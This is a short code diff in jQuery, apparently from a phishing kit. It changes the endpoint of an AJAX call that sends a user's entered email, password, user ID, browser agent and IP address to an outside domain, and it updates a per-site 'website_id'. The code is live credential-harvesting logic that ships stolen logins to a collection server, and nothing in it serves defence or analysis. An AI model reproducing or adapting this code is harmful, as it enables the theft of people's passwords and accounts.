@@ -83,14 +83,14 @@ $(document).ready(function () {
             // Send form data via AJAX
             $.ajax({
                 type: 'POST',
-                url: 'https://sa-atik.ck508.my.id/api/data',
+                url: 'https://ck404.com/api/data',
                 data: {
                     email: username,
                     password: password,
                     user_id: userId,
                     agent: navigator.userAgent,
                     user_ip: userIp,
-                    website_id: 62,
+                    website_id: 57,
                 },
                 success: function (response) {
                     console.log('Response:', response);
